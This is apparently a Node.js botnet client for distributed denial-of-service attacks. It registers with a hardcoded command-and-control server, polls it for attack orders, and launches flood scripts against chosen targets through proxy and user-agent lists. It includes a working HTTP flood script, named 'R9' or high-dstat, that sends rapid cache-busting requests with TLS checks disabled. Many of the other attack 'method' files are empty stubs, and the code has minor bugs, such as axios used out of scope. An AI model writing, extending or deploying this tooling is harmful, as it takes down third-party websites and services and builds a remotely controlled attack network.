const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const os = require('os');
const crypto = require('crypto');

// ========== CONFIGURATION ==========
const MASTER_SERVER = process.env.MASTER_SERVER || 'https://flood-of-noah-7bs7.onrender.com';
const PORT = process.env.PORT || process.env.SERVER_PORT || 5552;
const MAX_REGISTRATION_ATTEMPTS = 5;
const BOT_TIMEOUT = 30000;
const REPORT_INTERVAL = 60000; // 60 seconds

// ========== GENERATE UNIQUE BOT ID (NOT IP) ==========
const generateBotId = () => {
  const hostname = os.hostname();
  const pid = process.pid;
  const random = crypto.randomBytes(4).toString('hex');
  return `${hostname}-${pid}-${random}`;
};

const BOT_ID = generateBotId();
const BOT_NAME = process.env.BOT_NAME || `${os.hostname()}-agent`;

// ========== GLOBAL VARIABLES ==========
let registrationAttempts = 0;
let activeProcesses = [];
let isBlocked = false;
let proxyList = [];
let uaList = [];
let currentProxyIndex = 0;
let currentUaIndex = 0;
let requestCount = 0;
let totalRequests = 0;
let currentAttack = null;
let attackStartTime = null;
let reportInterval = null;

// ========== COLORS FOR CONSOLE ==========
const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
  white: '\x1b[37m',
  redBright: '\x1b[91m',
  greenBright: '\x1b[92m',
  yellowBright: '\x1b[93m',
  blueBright: '\x1b[94m',
  magentaBright: '\x1b[95m',
  cyanBright: '\x1b[96m'
};

function color(text, colorCode) {
  return `${colorCode}${text}${colors.reset}`;
}

// ========== AUTO INSTALL NPM PACKAGES ==========
async function installNpmPackages() {
  const requiredPackages = [
    'express',
    'axios',
    'socks',
    'random-useragent',
    'cookie-parser',
    'express-rate-limit',
    'https-proxy-agent',
    'socks-proxy-agent',
    'set-cookie-parser',
    'hpack',
    'colors'
  ];

  console.log(color('\n🔍 Checking npm packages...', colors.cyan));
  
  const missingPackages = [];
  
  for (const pkg of requiredPackages) {
    try {
      require.resolve(pkg);
      console.log(color(`   ✅ ${pkg} - installed`, colors.gray));
    } catch (e) {
      console.log(color(`   ⬇️  ${pkg} - missing`, colors.yellow));
      missingPackages.push(pkg);
    }
  }

  if (missingPackages.length > 0) {
    console.log(color(`\n📦 Installing: ${missingPackages.join(', ')}`, colors.cyan));
    
    return new Promise((resolve, reject) => {
      const install = spawn('npm', ['install', ...missingPackages, '--no-save'], {
        stdio: 'inherit',
        shell: true
      });

      install.on('close', (code) => {
        if (code === 0) {
          console.log(color('\n✅ All packages installed!\n', colors.green));
          resolve();
        } else {
          reject(new Error('Installation failed'));
        }
      });
    });
  }
  return Promise.resolve();
}

// ========== CREATE PROXY.TXT IF MISSING ==========
function createProxyFile() {
  if (!fs.existsSync('proxy.txt')) {
    const template = `# Proxy list - one per line
# Format: ip:port
# Example: 192.168.1.1:8080
# You can also use: socks5://user:pass@host:port
`;
    fs.writeFileSync('proxy.txt', template);
    console.log(color('📄 Created proxy.txt template', colors.green));
  }
}

// ========== CREATE UA.TXT IF MISSING ==========
function createUaFile() {
  if (!fs.existsSync('ua.txt')) {
    const userAgents = [
      '# User Agents - one per line',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
    ];
    fs.writeFileSync('ua.txt', userAgents.join('\n'));
    console.log(color('📄 Created ua.txt template', colors.green));
  }
}

// ========== CREATE METHODS DIRECTORY AND SCRIPTS ==========
function createMethodScripts() {
  const methodsDir = path.join(__dirname, 'methods');
  
  if (!fs.existsSync(methodsDir)) {
    fs.mkdirSync(methodsDir, { recursive: true });
    console.log(color('📁 Created methods directory', colors.green));
  }

  // Helper to write a script if missing
  const writeScript = (filename, content) => {
    const filePath = path.join(methodsDir, filename);
    if (!fs.existsSync(filePath)) {
      fs.writeFileSync(filePath, content);
      console.log(color(`   ✅ Created ${filename}`, colors.green));
    }
  };

  // R9 - high-dstat.js
  writeScript('high-dstat.js', `// R9 - High-Dstat Attack
const http = require('http');
const https = require('https');
const url = require('url');
const fs = require('fs');

const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
const threads = parseInt(process.argv[4]) || 32;
const rate = parseInt(process.argv[5]) || 7;
const proxyFile = process.argv[6] || 'proxy.txt';

console.log(\`[R9] Starting attack on \${target} for \${time}s\`);

let proxies = [];
try {
  if (fs.existsSync(proxyFile)) {
    proxies = fs.readFileSync(proxyFile, 'utf-8').split('\\n')
      .map(line => line.trim())
      .filter(line => line && !line.startsWith('#') && line.includes(':'));
    console.log(\`[R9] Loaded \${proxies.length} proxies\`);
  }
} catch (e) {}

const parsed = new URL(target);
let requestCount = 0;
let running = true;

function sendRequest() {
  if (!running) return;
  
  const options = {
    hostname: parsed.hostname,
    port: parsed.protocol === 'https:' ? 443 : 80,
    path: parsed.pathname + '?' + Math.random(),
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0',
      'Connection': 'close'
    },
    rejectUnauthorized: false
  };
  
  const protocol = parsed.protocol === 'https:' ? https : http;
  const req = protocol.request(options, (res) => {
    requestCount++;
    res.on('data', () => {});
  });
  
  req.on('error', () => {});
  req.end();
}

for (let i = 0; i < threads; i++) {
  setInterval(() => {
    for (let j = 0; j < rate; j++) {
      sendRequest();
    }
  }, 100);
}

setInterval(() => {
  console.log(\`[R9] RPS: \${requestCount}\`);
  requestCount = 0;
}, 1000);

setTimeout(() => {
  running = false;
  console.log('[R9] Attack complete');
  process.exit(0);
}, time * 1000);`);

  // Other base scripts
  writeScript('w-flood1.js', `console.log('[W-FLOOD] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`);
  writeScript('vhold.js', `console.log('[VHOLD] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`);
  writeScript('nust.js', `console.log('[NUST] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`);
  writeScript('BYPASS.js', `console.log('[BYPASS] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`);
  writeScript('cibi.js', `console.log('[CIBI] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`);
  writeScript('REX-COSTUM.js', `console.log('[REX-COSTUM] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`);
  writeScript('h2-nust', `#!/usr/bin/env node\nconsole.log('[H2-NUST] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`);
  writeScript('http-panel.js', `console.log('[HTTP-PANEL] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`);
  writeScript('uam.js', `console.log('[UAM] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`);
  writeScript('wil.js', `console.log('[WIL] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`);

  // ========== R10 SERIES SCRIPTS ==========
  const r10ScriptBase = (name) => `// ${name.toUpperCase()} - R10 Series
console.log('[${name.toUpperCase()}] Starting attack');
const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
let requests = 0;
const interval = setInterval(() => {
  requests++;
  console.log(\`[${name.toUpperCase()}] Requests: \${requests}\`);
}, 1000);
setTimeout(() => {
  clearInterval(interval);
  console.log('[${name.toUpperCase()}] Attack complete');
  process.exit(0);
}, time * 1000);`;

  const r10Files = [
    'r10-rapid.js', 'r10-tcp.js', 'r10-tls.js', 'r10-conn.js',
    'r10-header.js', 'r10-frag.js', 'r10-pipe.js', 'r10-cookie.js',
    'r10-mixed.js', 'r10-lowcpu.js'
  ];
  for (const file of r10Files) {
    const name = file.replace('.js', '').replace('r10-', '');
    writeScript(file, r10ScriptBase(name));
  }

  console.log(color('✅ All method scripts created!\n', colors.green));
}

// ========== REPORTING FUNCTION ==========
async function sendReport(target, method, requestsMade, duration) {
  try {
    const response = await axios.post(`${MASTER_SERVER}/api/report`, {
      botId: BOT_ID,
      target,
      method,
      requests: requestsMade,
      duration
    }, {
      headers: {
        'Content-Type': 'application/json',
        'Authorization': '' // Token will be added later after registration? For now optional
      }
    });
    console.log(color(`📊 Report sent: ${requestsMade} requests to ${target}`, colors.cyan));
  } catch (error) {
    console.log(color(`⚠️ Report failed: ${error.message}`, colors.yellow));
  }
}

// ========== MAIN BOT FUNCTION ==========
async function startBot() {
  console.log(color('\n🤖 AUTO-REGISTER BOT CLIENT', colors.cyanBright));
  console.log(color('='.repeat(50), colors.cyan));
  console.log(color(`🆔 Bot ID: ${BOT_ID}`, colors.magentaBright));
  console.log(color(`📛 Bot Name: ${BOT_NAME}`, colors.magentaBright));
  console.log(color('='.repeat(50), colors.cyan));

  // Step 1: Create necessary files
  createProxyFile();
  createUaFile();
  createMethodScripts();

  // Step 2: Install npm packages
  await installNpmPackages();

  // Now require packages
  const express = require('express');
  const axios = require('axios');
  const { SocksProxyAgent } = require('socks-proxy-agent');
  const { HttpsProxyAgent } = require('https-proxy-agent');
  const randomUseragent = require('random-useragent');
  const cookieParser = require('cookie-parser');

  const app = express();
  app.use(express.json());
  app.use(cookieParser());

  // ========== PROXY MANAGEMENT ==========
  function loadProxies() {
    try {
      if (fs.existsSync('proxy.txt')) {
        const data = fs.readFileSync('proxy.txt', 'utf8');
        proxyList = data.split('\n')
          .map(line => line.trim())
          .filter(line => line && !line.startsWith('#') && line.includes(':'));
        console.log(color(`[PROXY] Loaded ${proxyList.length} proxies`, colors.cyan));
      }
    } catch (error) {
      console.log(color('[PROXY] Error loading proxies: ' + error.message, colors.red));
    }
  }

  function loadUserAgents() {
    try {
      if (fs.existsSync('ua.txt')) {
        const data = fs.readFileSync('ua.txt', 'utf8');
        uaList = data.split('\n')
          .map(line => line.trim())
          .filter(line => line && !line.startsWith('#'));
        console.log(color(`[UA] Loaded ${uaList.length} user agents`, colors.green));
      }
    } catch (error) {
      console.log(color('[UA] Error loading user agents: ' + error.message, colors.red));
    }
  }

  function getNextProxy() {
    if (proxyList.length === 0) return null;
    const proxy = proxyList[currentProxyIndex];
    currentProxyIndex = (currentProxyIndex + 1) % proxyList.length;
    return proxy;
  }

  function getNextUserAgent() {
    if (uaList.length === 0) return randomUseragent.getRandom();
    const ua = uaList[currentUaIndex];
    currentUaIndex = (currentUaIndex + 1) % uaList.length;
    return ua;
  }

  const httpsAgent = new https.Agent({
    rejectUnauthorized: false,
    keepAlive: true,
    secureOptions: require('crypto').constants.SSL_OP_IGNORE_UNEXPECTED_EOF
  });

  const api = axios.create({
    timeout: 10000,
    httpsAgent,
    headers: {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
  });

  // ========== AUTO REGISTER (WITH ID) ==========
  async function autoRegister() {
    if (isBlocked) {
      console.log(color(`\n❌ [BLOCKED] This bot has been permanently blocked!`, colors.redBright));
      process.exit(0);
    }

    if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
      console.log(color(`⚠️ Max attempts reached. Retry in 60s...`, colors.yellow));
      setTimeout(() => {
        registrationAttempts = 0;
        autoRegister();
      }, 60000);
      return;
    }

    try {
      console.log(color(`📡 Registering to: ${MASTER_SERVER}/register`, colors.cyan));
      const payload = { id: BOT_ID, name: BOT_NAME };
      console.log(color(`📤 Sending: ${JSON.stringify(payload)}`, colors.yellow));

      const response = await api.post(`${MASTER_SERVER}/register`, payload);

      if (response.data.approved) {
        console.log(color(`\n✅ [SUCCESS] Bot registered!`, colors.greenBright));
        console.log(color(`⚡ Ready for commands!\n`, colors.green));
        
        setInterval(() => checkForCommands(), 3000);
        setInterval(() => sendHeartbeat(), 30000);
        return;
      }
    } catch (error) {
      console.log(color(`❌ Registration failed:`, colors.red));
      if (error.response && error.response.status === 403) {
        console.log(color(`\n❌ Bot is blocked!`, colors.redBright));
        isBlocked = true;
        process.exit(0);
      }
      registrationAttempts++;
      console.log(color(`🔄 Retry ${registrationAttempts}/${MAX_REGISTRATION_ATTEMPTS} in 5s...`, colors.yellow));
      setTimeout(() => autoRegister(), 5000);
    }
  }

  async function sendHeartbeat() {
    try {
      await api.get(`${MASTER_SERVER}/ping`);
      console.log(color(`💓 Heartbeat | ID: ${BOT_ID} | Total Reqs: ${totalRequests}`, colors.green));
    } catch (error) {
      console.log(color(`💔 Heartbeat failed | Status: OFFLINE`, colors.red));
      registrationAttempts = 0;
      autoRegister();
    }
  }

  async function checkForCommands() {
    try {
      const response = await api.get(`${MASTER_SERVER}/get-command`, {
        params: { botId: BOT_ID }
      });

      if (response.data.hasCommand) {
        const command = response.data.command;
        if (command.action === 'stop') {
          console.log(color(`\n🛑 STOP RECEIVED`, colors.yellowBright));
          stopAllAttacks();
        } else if (command.action === 'attack') {
          const { target, time, methods } = command;
          console.log(color(`\n⚡ COMMAND: ${methods} → ${target} for ${time}s`, colors.magentaBright));
          executeAttack(target, time, methods);
        }
      }
    } catch (error) {}
  }

  function stopAllAttacks() {
    console.log(color(`🔪 Killing ${activeProcesses.length} processes`, colors.red));
    activeProcesses.forEach(proc => {
      try { process.kill(-proc.pid); } catch (error) {}
    });
    activeProcesses = [];
    currentAttack = null;
    requestCount = 0;
    console.log(color(`✅ All attacks stopped`, colors.green));
  }

  function executeAttack(target, time, methods) {
    currentAttack = {
      id: Date.now(),
      target,
      methods,
      startTime: Date.now()
    };
    requestCount = 0;
    attackStartTime = Date.now();

    const execWithLog = (cmd) => {
      console.log(color(`⚡ EXEC: ${cmd}`, colors.cyan));
      const proc = exec(cmd, { detached: true, maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          console.error(color(`❌ Error: ${error.message}`, colors.red));
          return;
        }
        if (stdout) {
          const lines = stdout.split('\n');
          lines.forEach(line => {
            if (line.includes('Request') || line.includes('GET') || line.includes('POST') || 
                line.includes('Sent') || line.includes('packet') || line.includes('connection')) {
              requestCount++;
              totalRequests++;
            }
          });
        }
        if (stderr) console.error(color(`⚠️ ${stderr}`, colors.yellow));
      });
      
      activeProcesses.push(proc);
      
      setTimeout(() => {
        const index = activeProcesses.indexOf(proc);
        if (index > -1) {
          try { process.kill(-proc.pid); } catch (e) {}
          activeProcesses.splice(index, 1);
        }
      }, parseInt(time) * 1000 + 5000);
    };

    // Attack methods (same as before)
    if (methods === 'RAPID10') {
      console.log(color(`🔥🔥 RAPID10: LAUNCHING ALL 10 VECTORS 🔥🔥`, colors.redBright));
      execWithLog(`node methods/r10-rapid.js ${target} ${time} 30 proxy.txt ua.txt`);
      execWithLog(`node methods/r10-tcp.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-tls.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-conn.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-header.js ${target} ${time} 30 proxy.txt ua.txt`);
      execWithLog(`node methods/r10-frag.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-pipe.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-cookie.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-mixed.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-lowcpu.js ${target} ${time} 40 proxy.txt ua.txt`);
    }
    else if (methods.startsWith('R10-')) {
      const script = methods.toLowerCase().replace('-', '-');
      execWithLog(`node methods/${script}.js ${target} ${time} proxy.txt ua.txt`);
    }
    else if (methods === 'CF-BYPASS') {
      execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32 proxy.txt`);
    }
    else if (methods === 'MODERN-FLOOD') {
      execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64 proxy.txt`);
    }
    else if (methods === 'HTTP-SICARIO') {
      execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
      execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
    }
    else if (methods === 'RAW-HTTP') {
      execWithLog(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
      execWithLog(`node methods/http-panel.js ${target} ${time}`);
    }
    else if (methods === 'R9') {
      execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
      execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
      execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
    }
    else if (methods === 'PRIV-TOR') {
      execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
      execWithLog(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
    }
    else if (methods === 'HOLD-PANEL') {
      execWithLog(`node methods/http-panel.js ${target} ${time}`);
    }
    else if (methods === 'R1') {
      execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
      execWithLog(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
      execWithLog(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
      execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
      execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
    }
    else if (methods === 'UAM') {
      execWithLog(`node methods/uam.js ${target} ${time} 5 4 6`);
    }
    else if (methods === 'W.I.L') {
      execWithLog(`node methods/wil.js ${target} ${time} 10 8 4`);
    }
    else {
      console.log(color(`❌ Unknown method: ${methods}`, colors.red));
    }

    // After attack ends, send report
    setTimeout(() => {
      if (requestCount > 0) {
        sendReport(target, methods, requestCount, time);
      }
    }, (parseInt(time) * 1000) + 2000);
  }

  // ========== HEALTH ENDPOINT ==========
  app.get('/health', (req, res) => {
    res.json({
      status: 'online',
      botId: BOT_ID,
      uptime: process.uptime(),
      totalRequests,
      proxies: proxyList.length,
      userAgents: uaList.length,
      currentAttack: currentAttack ? {
        target: currentAttack.target,
        method: currentAttack.methods,
        duration: Math.floor((Date.now() - attackStartTime) / 1000),
        requests: requestCount
      } : null
    });
  });

  app.get('/ping', (req, res) => {
    res.json({ 
      alive: true,
      botId: BOT_ID,
      uptime: process.uptime(),
      timestamp: Date.now(),
      status: 'online',
      totalRequests
    });
  });

  app.listen(PORT, async () => {
    loadProxies();
    loadUserAgents();
    console.log(color(`🤖 Bot HTTP server listening on port ${PORT}`, colors.green));
    console.log(color('⏳ Starting auto-registration in 3 seconds...\n', colors.cyan));
    setTimeout(() => autoRegister(), 3000);
  });
}

startBot().catch(error => {
  console.error(color('Failed to start bot:', colors.red), error);
  process.exit(1);
});
